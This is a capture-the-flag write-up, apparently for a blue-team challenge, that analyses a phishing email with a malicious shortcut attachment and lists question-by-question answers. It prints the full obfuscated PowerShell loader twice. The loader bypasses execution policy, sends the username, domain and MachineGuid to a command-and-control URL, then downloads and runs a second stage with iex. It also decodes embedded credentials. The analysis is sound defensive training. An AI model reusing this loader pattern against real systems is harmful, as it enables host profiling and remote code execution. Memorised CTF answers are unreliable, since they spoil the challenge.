# Advent of The Relics 1: A Call from the Museum

## 1 Who is the suspicious sender of the email?

> **ANSWER:** `eu-health@ca1e-corp.org`

## 2 What is the legitimate server that initially sent the email?

> **ANSWER:** `BG1P293CU004.outbound.protection.outlook.com`

## 3 What is the attachment filename?

> **ANSWER:** `Health_Clearance-December_Archive.zip`

## 4 What is the Document Code?

The email has 2 pieces of base64-encoded content: some HTML content and `Health_Clearance-December_Archive.zip`

After base64-decoding `Health_Clearance-December_Archive.zip` and extracting it, we get `Health_Clearance_Guidelines.pdf` & `EU_Health_Compliance_Portal.lnk`.
The document code can be found in `Health_Clearance_Guidelines.pdf`.

> **ANSWER:** `EU-HMU-24X`

## 5 What is the full URL of the C2 contacted through a POST request?

Instead of opening the dangerous file, I checked [VirusTotal](https://www.virustotal.com/gui/file/e5389af56fae1ed9c3eb85a96bd0f0a2493cec8129c7767bb6b792d1f583144e/).

```sh
$ md5sum EU_Health_Compliance_Portal.lnk
73c4fad2a4d437fa1d21dd75a17aad7f  EU_Health_Compliance_Portal.lnk
```

The [Behavior](https://www.virustotal.com/gui/file/e5389af56fae1ed9c3eb85a96bd0f0a2493cec8129c7767bb6b792d1f583144e/behavior) tab contains the information we want.

The following commands are suspicious:

```pwsh
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -nONi -nOp -eXeC bYPaSs -cOmManD "$Bs = (-join('Basic c3','ZjX3Rlb','XA6U2','5','vd0JsY','WNrT','3V','0X','zIwM','jYh'));sap`s .\Health_Clearance_Guidelines.pdf;$AX=$env:USERNAME;$oM=[System.Uri]::UnescapeDataString('https%3A%2F%2Fhealth%2Dstatus%2Drs%2Ecom%2Fapi%2Fv1%2Fcheckin');$Bz=$env:USERDOMAIN;$Lj=[System.Uri]::UnescapeDataString('https%3A%2F%2Fadvent%2Dof%2Dthe%2Drelics%2Dforum%2Ehtb%2Eblue%2Fapi%2Fv1%2Fimplant%2Fcid%3D');$Mw=(gp HKLM:\SOFTWARE\Microsoft\Cryptography).MachineGuid;$pP = @{u=$AX;d=$Bz;g=$Mw};$Zu=(i`wr $oM -Method POST -Body $pP).Content;$Hd = @{Authorization = $Bs };i`wr -Headers $Hd $Lj$Zu | i`ex; "
```

From that PowerShell payload (or Under "Network Communication"), we have a URL.

> **ANSWER:** `https://health-status-rs.com/api/v1/checkin`

## 6 The malicious script sent three pieces of information in the POST request. What is the registry key from which the last one is retrieved?

Another (partial) URL is `https://advent-of-the-relics-forum.htb.blue/api/v1/implant/cid=`, and with it is `gp HKLM:\SOFTWARE\Microsoft\Cryptography).MachineGuid`.

> **ANSWER:** `HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid`

## 7 Then the script downloads and executes a second stage from another URL. What is the domain?

> **ANSWER:** `advent-of-the-relics-forum.htb.blue`

## 8 A set of credentials was used to access the previous resource. Retrieve them.

Formatting the previous suspicious command, we get:

```pwsh
$Bs = (-join('Basic c3','ZjX3Rlb','XA6U2','5','vd0JsY','WNrT','3V','0X','zIwM','jYh'));
sap`s .\Health_Clearance_Guidelines.pdf;
$AX=$env:USERNAME;
$oM=[System.Uri]::UnescapeDataString('https%3A%2F%2Fhealth%2Dstatus%2Drs%2Ecom%2Fapi%2Fv1%2Fcheckin');
$Bz=$env:USERDOMAIN;
$Lj=[System.Uri]::UnescapeDataString('https%3A%2F%2Fadvent%2Dof%2Dthe%2Drelics%2Dforum%2Ehtb%2Eblue%2Fapi%2Fv1%2Fimplant%2Fcid%3D');
$Mw=(gp HKLM:\SOFTWARE\Microsoft\Cryptography).MachineGuid;
$pP = @{u=$AX;d=$Bz;g=$Mw};
$Zu=(i`wr $oM -Method POST -Body $pP).Content;
$Hd = @{Authorization = $Bs };
i`wr -Headers $Hd $Lj$Zu | i`ex;
```

The `Basic ` seems like part of an "[Authorization](`https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Authorization`) [Basic](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Authentication#basic_authentication_scheme)" header, which would be the credential we're looking for.
If we `echo $Bs`, we get `Basic c3ZjX3RlbXA6U25vd0JsYWNrT3V0XzIwMjYh`, which we can base64-decode to get the credentials.

```sh
echo 'c3ZjX3RlbXA6U25vd0JsYWNrT3V0XzIwMjYh' | base64 -d
svc_temp:SnowBlackOut_2026!
```

> **ANSWER:** `svc_temp:SnowBlackOut_2026!`
